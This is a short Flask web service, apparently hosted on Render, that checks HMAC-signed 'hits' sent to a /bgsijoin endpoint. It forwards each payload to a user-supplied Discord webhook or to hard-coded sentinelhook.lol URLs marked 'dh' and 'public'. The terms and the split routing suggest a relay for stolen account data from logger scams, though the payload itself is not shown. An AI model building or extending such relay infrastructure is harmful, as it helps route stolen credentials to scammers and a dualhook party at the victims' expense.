from flask import Flask, request, abort, jsonify
import hmac
import hashlib
import time
import os
import requests

app = Flask(__name__)

SECRET = os.environ.get("SECRET", "").encode("utf-8")
if not SECRET:
    raise ValueError("SECRET env var missing – set it in Render dashboard!")

@app.route("/bgsijoin", methods=["POST"])
def receive_hit():
    timestamp = request.headers.get("X-Timestamp")
    signature = request.headers.get("X-Signature")
    target = request.headers.get("X-Target")  # "private", "dh", or "public"

    if not timestamp or not signature or not target:
        abort(403, "Missing required headers")

    try:
        ts = int(timestamp)
        if abs(time.time() - ts) > 300:  # 5 minutes window
            abort(403, "Timestamp expired")
    except:
        abort(403, "Invalid timestamp")

    payload_raw = request.get_data(as_text=True)
    message = f"{timestamp}.{payload_raw}"
    expected_sig = hmac.new(SECRET, message.encode("utf-8"), hashlib.sha256).hexdigest()

    if not hmac.compare_digest("v1=" + expected_sig, signature):
        abort(403, "Invalid signature")

    # Forward to correct destination
    if target == "private":
        user_webhook = request.headers.get("X-User-Webhook")
        if not user_webhook or not user_webhook.startswith("https://discord.com/api/webhooks/"):
            abort(400, "Invalid/missing user webhook")
        forward_url = user_webhook
    elif target == "dh":
        forward_url = "https://sentinelhook.lol/api.php?id=84G8pHk1nXxicwk"
    elif target == "public":
        forward_url = "https://sentinelhook.lol/api.php?id=Gc19GPjuqjxrrMQ"
    else:
        abort(400, "Invalid target")

    try:
        resp = requests.post(
            forward_url,
            data=payload_raw,
            headers={"Content-Type": "application/json"}
        )
        resp.raise_for_status()
    except Exception as e:
        return jsonify({"error": str(e)}), 502

    return jsonify({"status": "ok"}), 200

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
